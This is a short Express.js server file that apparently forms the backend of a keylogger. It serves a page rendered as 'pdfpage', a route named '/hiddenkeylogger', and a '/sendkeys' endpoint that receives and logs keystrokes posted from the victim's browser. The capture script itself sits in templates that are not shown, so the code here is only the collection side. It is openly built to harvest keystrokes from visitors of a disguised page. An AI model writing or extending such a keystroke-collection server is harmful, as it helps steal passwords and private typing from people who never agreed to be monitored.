const express = require("express"),
  app = express(),
  bodyParser = require("body-parser"),
  keyloggerService = require("./services/keyLoggerService");

app.set("view engine", "pug");
app.set("views", "./pug");
app.use(express.static("resources"));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.get("/", (req, res) => {
  res.render("pdfpage.pug");
});

app.get("/hiddenkeylogger", (req, res) => {
  res.render("keylogger.pug");
});

app.post("/sendkeys", (req, res) => {
  // Placeholder for post mapping.
  console.log(req.body);
  console.log(JSON.stringify(req.body));
  res.sendStatus(200);
});

app.listen(8080, () => {
  console.log("server started");
});
